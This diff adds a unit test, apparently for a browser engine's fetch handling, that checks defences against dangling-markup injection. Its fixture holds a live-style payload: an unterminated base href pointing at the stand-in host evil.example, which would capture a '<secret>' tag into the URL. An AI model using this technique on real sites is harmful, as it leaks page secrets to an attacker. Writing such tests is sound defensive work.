@@ -259,6 +259,27 @@ public sealed class FetchTests : IDisposable
     }
 
     [Fact]
+    public void Fetch_DanglingMarkup_BaseUrlAndBodyBackground()
+    {
+        _loader.Handler = request => request.Url.StartsWith("https://evil.example/", StringComparison.Ordinal) ? new DocumentResource("") { Headers = [new("Access-Control-Allow-Origin", "*")] } : null;
+
+        // The URLs that depend on the base URL, whose href had a newline and a "<", are not requested: an empty URL (the base URL
+        // itself), "https:" (which copies its path and query), and the image of the background attribute, which a CSS value
+        // would no longer flag. An absolute URL does not depend on it.
+        var document = Load("""
+            <base href="https://evil.example/base?x=
+            <secret>">
+            <body background="#bg">
+            <script>
+              Promise.all([fetch(''), fetch('https:')].map(p => p.then(() => 'resolved', e => e.name))).then(results => { document.title = results.join('|') + '|' + getComputedStyle(document.body).backgroundImage + '|' + fetch('https://evil.example/absolute').then(() => {}); });
+            </script>
+            """);
+
+        Assert.Equal("TypeError|TypeError|none|[object Promise]", document.Title);
+        Assert.Equal(["https://evil.example/absolute"], _loader.Requests.Select(request => request.Url).Where(url => url.StartsWith("https://evil.example/", StringComparison.Ordinal)).Distinct(StringComparer.Ordinal));
+    }
+
+    [Fact]
     public void Fetch_Abort_RejectsWithTheReason()
     {
         _loader.Responses["https://example.com/data"] = new DocumentResource("data");
